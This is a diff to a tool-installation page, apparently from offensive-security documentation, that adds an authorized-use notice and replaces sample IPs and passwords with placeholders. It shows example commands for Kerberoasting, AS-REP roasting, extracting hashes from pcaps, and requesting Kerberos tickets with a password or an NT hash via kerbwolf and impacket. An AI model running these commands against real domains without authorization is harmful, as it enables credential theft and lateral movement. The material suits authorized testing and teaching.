@@ -4,6 +4,8 @@ Installation and verification of the tools referenced throughout the Attacks sec
 tools are installed with [uv](https://docs.astral.sh/uv/) as isolated tool environments -- no
 virtual environment management or `pip install` required.
 
+--8<-- "includes/authorized-use.md"
+
 ---
 
 ## Quick Install
@@ -49,19 +51,19 @@ kw-tgt --help
 
 ```bash title="kerbwolf — Kerberoast, AS-REP roast, extract from pcap, and request TGT"
 # Kerberoast all accounts with SPNs
-kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u user -p pass -o hashes.txt
+kw-roast -d CORP.LOCAL --dc-ip 192.0.2.10 -u user -p '<password>' -o hashes.txt
 
 # AS-REP roast using LDAP discovery
-kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -u user -p pass --ldap -o hashes.txt
+kw-asrep -d CORP.LOCAL --dc-ip 192.0.2.10 -u user -p '<password>' --ldap -o hashes.txt
 
 # Extract hashes from a pcap
 kw-extract capture.pcapng -o hashes.txt
 
 # Request a TGT using a password
-kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u user -p pass
+kw-tgt -d CORP.LOCAL --dc-ip 192.0.2.10 -u user -p '<password>'
 
 # Request a TGT using an NT hash (pass-the-key)
-kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u user -H <NT_HASH>
+kw-tgt -d CORP.LOCAL --dc-ip 192.0.2.10 -u user -H <NT_HASH>
 ```
 
 ---
@@ -106,7 +108,7 @@ ticketer.py --help
 
 ```bash title="impacket — get TGT, get service ticket, describe ticket, forge Golden Ticket"
 # Get a TGT
-getTGT.py CORP.LOCAL/user:pass -dc-ip 10.0.0.1
+getTGT.py 'CORP.LOCAL/user:<password>' -dc-ip 192.0.2.10
 
 # Get a service ticket
 export KRB5CCNAME=user.ccache
